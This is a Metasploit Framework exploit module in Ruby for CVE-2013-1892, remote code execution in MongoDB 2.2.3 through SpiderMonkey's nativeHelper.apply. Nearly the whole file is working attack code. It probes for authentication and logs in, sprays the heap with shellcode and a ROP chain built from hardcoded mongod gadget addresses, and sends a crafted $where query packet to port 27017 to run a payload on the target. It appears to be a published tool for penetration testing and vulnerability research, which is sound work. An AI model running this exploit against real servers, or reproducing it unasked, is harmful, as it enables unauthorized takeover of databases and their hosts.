##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'MongoDB nativeHelper.apply Remote Code Execution',
      'Description'  => %q{
          This module exploit a the nativeHelper feature from spiderMonkey which allows to
        to control execution by calling it wit specially crafted arguments. This module
        has been tested successfully on MongoDB 2.2.3 on Ubuntu 10.04 and Debian Squeeze.
      },
      'Author'         =>
        [
          'agix' # @agixid # Vulnerability discovery and Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-1892' ],
          [ 'OSVDB', '91632' ],
          [ 'BID', '58695' ],
          [ 'URL', 'http://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/' ]
        ],
      'Platform'       => 'linux',
      'Targets'        =>
        [
          [ 'Linux - mongod 2.2.3 - 32bits',
            {
              'Arch' => ARCH_X86,
              'mmap' => [
                  0x0816f768,  # mmap64@plt # from mongod
                  0x08666d07, # add esp, 0x14 / pop ebx / pop ebp / ret # from mongod
                  0x31337000,
                  0x00002000,
                  0x00000007,
                  0x00000031,
                  0xffffffff,
                  0x00000000,
                  0x00000000,
                  0x0816e4c8,  # memcpy@plt # from mongod
                  0x31337000,
                  0x31337000,
                  0x0c0b0000,
                  0x00002000
              ],
              'ret'     => 0x08055a70, # ret # from mongod
              'gadget1' => 0x0836e204, # mov eax,DWORD PTR [eax] / call DWORD PTR [eax+0x1c]
              # These gadgets need to be composed with bytes < 0x80
              'gadget2' => 0x08457158, # xchg esp,eax / add esp,0x4 / pop ebx / pop ebp / ret <== this gadget must xchg esp,eax and then increment ESP
              'gadget3' => 0x08351826, # add esp,0x20 / pop esi / pop edi / pop ebp <== this gadget placed before gadget2 increment ESP to escape gadget2
              'gadget4' => 0x08055a6c, # pop eax / ret
              'gadget5' => 0x08457158  # xchg esp,eax
            }
          ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Mar 24 2013',
      'License'      => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(27017),
        OptString.new('DB', [ true, "Database to use", "admin"]),
        OptString.new('COLLECTION', [ false, "Collection to use (it must to exist). Better to let empty", ""]),
        OptString.new('USERNAME', [ false, "Login to use", ""]),
        OptString.new('PASSWORD', [ false, "Password to use", ""])
      ], self.class)
  end

  def exploit
    begin
      connect
      if require_auth?
        print_status("Mongo server #{datastore['RHOST']} use authentication...")
        if !datastore['USERNAME'] || !datastore['PASSWORD']
          disconnect
          fail_with(Exploit::Failure::BadConfig, "USERNAME and PASSWORD must be provided")
        end
        if do_login==0
          disconnect
          fail_with(Exploit::Failure::NoAccess, "Authentication failed")
        end
      else
        print_good("Mongo server #{datastore['RHOST']} doesn't use authentication")
      end

      if datastore['COLLECTION'] && datastore['COLLECTION'] != ""
        collection = datastore['COLLECTION']
      else
        collection = Rex::Text.rand_text(4, nil, 'abcdefghijklmnopqrstuvwxyz')
        if read_only?(collection)
          disconnect
          fail_with(Exploit::Failure::BadConfig, "#{datastore['USERNAME']} has read only access, please provide an existent collection")
        else
          print_good("New document created in collection #{collection}")
        end
      end

      print_status("Let's exploit, heap spray could take some time...")
      my_target = target
      shellcode = Rex::Text.to_unescape(payload.encoded)
      mmap = my_target['mmap'].pack("V*")
      ret = [my_target['ret']].pack("V*")
      gadget1 = "0x#{my_target['gadget1'].to_s(16)}"
      gadget2 = Rex::Text.to_hex([my_target['gadget2']].pack("V"))
      gadget3 = Rex::Text.to_hex([my_target['gadget3']].pack("V"))
      gadget4 = Rex::Text.to_hex([my_target['gadget4']].pack("V"))
      gadget5 = Rex::Text.to_hex([my_target['gadget5']].pack("V"))

      shellcode_var="a"+Rex::Text.rand_text_hex(4)
      sizechunk_var="b"+Rex::Text.rand_text_hex(4)
      chunk_var="c"+Rex::Text.rand_text_hex(4)
      i_var="d"+Rex::Text.rand_text_hex(4)
      array_var="e"+Rex::Text.rand_text_hex(4)

      ropchain_var="f"+Rex::Text.rand_text_hex(4)
      chunk2_var="g"+Rex::Text.rand_text_hex(4)
      array2_var="h"+Rex::Text.rand_text_hex(4)

      # nopsled + shellcode heapspray
      payload_js = shellcode_var+'=unescape("'+shellcode+'");'
      payload_js << sizechunk_var+'=0x1000;'
      payload_js << chunk_var+'="";'
      payload_js << 'for('+i_var+'=0;'+i_var+'<'+sizechunk_var+';'+i_var+'++){ '+chunk_var+'+=unescape("%u9090%u9090"); } '
      payload_js << chunk_var+'='+chunk_var+'.substring(0,('+sizechunk_var+'-'+shellcode_var+'.length));'
      payload_js << array_var+'=new Array();'
      payload_js << 'for('+i_var+'=0;'+i_var+'<25000;'+i_var+'++){ '+array_var+'['+i_var+']='+chunk_var+'+'+shellcode_var+'; } '

      # retchain + ropchain heapspray
      payload_js << ropchain_var+'=unescape("'+Rex::Text.to_unescape(mmap)+'");'
      payload_js << chunk2_var+'="";'
      payload_js << 'for('+i_var+'=0;'+i_var+'<'+sizechunk_var+';'+i_var+'++){ '+chunk2_var+'+=unescape("'+Rex::Text.to_unescape(ret)+'"); } '
      payload_js << chunk2_var+'='+chunk2_var+'.substring(0,('+sizechunk_var+'-'+ropchain_var+'.length));'
      payload_js << array2_var+'=new Array();'
      payload_js << 'for('+i_var+'=0;'+i_var+'<25000;'+i_var+'++){ '+array2_var+'['+i_var+']='+chunk2_var+'+'+ropchain_var+'; } '

      # Trigger and first ropchain
      payload_js << 'nativeHelper.apply({"x" : '+gadget1+'}, '
      payload_js << '["A"+"'+gadget3+'"+"'+Rex::Text.rand_text_hex(12)+'"+"'+gadget2+'"+"'+Rex::Text.rand_text_hex(28)+'"+"'+gadget4+'"+"\\x20\\x20\\x20\\x20"+"'+gadget5+'"]);'

      request_id = Rex::Text.rand_text(4)

      packet = request_id           #requestID
      packet << "\xff\xff\xff\xff"   #responseTo
      packet << "\xd4\x07\x00\x00"  #opCode (2004 OP_QUERY)
      packet << "\x00\x00\x00\x00"   #flags
      packet << datastore['DB']+"."+collection+"\x00" #fullCollectionName (db.collection)
      packet << "\x00\x00\x00\x00"   #numberToSkip (0)
      packet << "\x01\x00\x00\x00"   #numberToReturn (1)

      where = "\x02\x24\x77\x68\x65\x72\x65\x00"
      where << [payload_js.length+4].pack("L")
      where << payload_js+"\x00"

      where.insert(0, [where.length + 4].pack("L"))

      packet += where
      packet.insert(0, [packet.length + 4].pack("L"))

      sock.put(packet)

      disconnect
    rescue ::Exception => e
      fail_with(Exploit::Failure::Unreachable, "Unable to connect")
    end
  end

  def require_auth?
    request_id = Rex::Text.rand_text(4)
    packet =  "\x3f\x00\x00\x00"   #messageLength (63)
    packet << request_id           #requestID
    packet << "\xff\xff\xff\xff"   #responseTo
    packet << "\xd4\x07\x00\x00"  #opCode (2004 OP_QUERY)
    packet << "\x00\x00\x00\x00"   #flags
    packet << "\x61\x64\x6d\x69\x6e\x2e\x24\x63\x6d\x64\x00" #fullCollectionName (admin.$cmd)
    packet << "\x00\x00\x00\x00"   #numberToSkip (0)
    packet << "\x01\x00\x00\x00"   #numberToReturn (1)
    #query ({"listDatabases"=>1})
    packet << "\x18\x00\x00\x00\x10\x6c\x69\x73\x74\x44\x61\x74\x61\x62\x61\x73\x65\x73\x00\x01\x00\x00\x00\x00"

    sock.put(packet)
    response = sock.get_once

    have_auth_error?(response)
  end

  def read_only?(collection)
    request_id = Rex::Text.rand_text(4)
    _id = "\x07_id\x00"+Rex::Text.rand_text(12)+"\x02"
    key = Rex::Text.rand_text(4, nil, 'abcdefghijklmnopqrstuvwxyz')+"\x00"
    value = Rex::Text.rand_text(4, nil, 'abcdefghijklmnopqrstuvwxyz')+"\x00"

    insert = _id+key+[value.length].pack("L")+value+"\x00"

    packet =  [insert.length+24+datastore['DB'].length+6].pack("L")   #messageLength
    packet << request_id           #requestID
    packet << "\xff\xff\xff\xff"   #responseTo
    packet <<  "\xd2\x07\x00\x00"  #opCode (2002 Insert Document)
    packet << "\x00\x00\x00\x00"   #flags
    packet << datastore['DB'] + "." + collection + "\x00" #fullCollectionName (DB.collection)
    packet << [insert.length+4].pack("L")
    packet << insert

    sock.put(packet)

    request_id = Rex::Text.rand_text(4)

    packet =  [datastore['DB'].length + 61].pack("L")   #messageLength (66)
    packet << request_id           #requestID
    packet << "\xff\xff\xff\xff"   #responseTo
    packet <<  "\xd4\x07\x00\x00"  #opCode (2004 Query)
    packet << "\x00\x00\x00\x00"   #flags
    packet << datastore['DB'] + ".$cmd" + "\x00" #fullCollectionName (DB.$cmd)
    packet << "\x00\x00\x00\x00"   #numberToSkip (0)
    packet << "\xff\xff\xff\xff"   #numberToReturn (1)
    packet << "\x1b\x00\x00\x00"
    packet << "\x01\x67\x65\x74\x6c\x61\x73\x74\x65\x72\x72\x6f\x72\x00\x00\x00\x00\x00\x00\x00\xf0\x3f\x00"

    sock.put(packet)

    response = sock.get_once
    have_auth_error?(response)
  end

  def do_login
    print_status("Trying #{datastore['USERNAME']}/#{datastore['PASSWORD']} on #{datastore['DB']} database")
    nonce = get_nonce
    status = auth(nonce)
    return status
  end

  def auth(nonce)
    request_id = Rex::Text.rand_text(4)
    packet =  request_id           #requestID
    packet << "\xff\xff\xff\xff"   #responseTo
    packet <<  "\xd4\x07\x00\x00"  #opCode (2004 OP_QUERY)
    packet << "\x00\x00\x00\x00"   #flags
    packet << datastore['DB'] + ".$cmd" + "\x00" #fullCollectionName (DB.$cmd)
    packet << "\x00\x00\x00\x00"   #numberToSkip (0)
    packet << "\xff\xff\xff\xff"   #numberToReturn (1)

    #{"authenticate"=>1.0, "user"=>"root", "nonce"=>"94e963f5b7c35146", "key"=>"61829b88ee2f8b95ce789214d1d4f175"}
    document =  "\x01\x61\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x65"
    document << "\x00\x00\x00\x00\x00\x00\x00\xf0\x3f\x02\x75\x73\x65\x72\x00"
    document << [datastore['USERNAME'].length + 1].pack("L") # +1 due null byte termination
    document << datastore['USERNAME'] + "\x00"
    document << "\x02\x6e\x6f\x6e\x63\x65\x00\x11\x00\x00\x00"
    document << nonce + "\x00"
    document << "\x02\x6b\x65\x79\x00\x21\x00\x00\x00"
    document << Rex::Text.md5(nonce + datastore['USERNAME'] + Rex::Text.md5(datastore['USERNAME'] + ":mongo:" + datastore['PASSWORD'])) + "\x00"
    document << "\x00"
    #Calculate document length
    document.insert(0, [document.length + 4].pack("L"))

    packet += document

    #Calculate messageLength
    packet.insert(0, [(packet.length + 4)].pack("L"))  #messageLength
    sock.put(packet)
    response = sock.get_once
    if have_auth_error?(response)
      print_error("Bad login or DB")
      return 0
    else
      print_good("Successful login on DB #{datastore['db']}")
      return 1
    end


  end

  def get_nonce
    request_id = Rex::Text.rand_text(4)
    packet =  [datastore['DB'].length + 57].pack("L")   #messageLength (57+DB.length)
    packet << request_id           #requestID
    packet << "\xff\xff\xff\xff"   #responseTo
    packet <<  "\xd4\x07\x00\x00"  #opCode (2004 OP_QUERY)
    packet << "\x00\x00\x00\x00"   #flags
    packet << datastore['DB'] + ".$cmd" + "\x00" #fullCollectionName (DB.$cmd)
    packet << "\x00\x00\x00\x00"   #numberToSkip (0)
    packet << "\x01\x00\x00\x00"   #numberToReturn (1)
    #query {"getnonce"=>1.0}
    packet << "\x17\x00\x00\x00\x01\x67\x65\x74\x6e\x6f\x6e\x63\x65\x00\x00\x00\x00\x00\x00\x00\xf0\x3f\x00"

    sock.put(packet)
    response = sock.get_once
    documents = response[36..1024]
    #{"nonce"=>"f785bb0ea5edb3ff", "ok"=>1.0}
    nonce = documents[15..30]
  end

  def have_auth_error?(response)
    #Response header 36 bytes long
    documents = response[36..1024]
    #{"errmsg"=>"auth fails", "ok"=>0.0}
    #{"errmsg"=>"need to login", "ok"=>0.0}
    if documents.include?('errmsg') || documents.include?('unauthorized')
      return true
    else
      return false
    end
  end
end
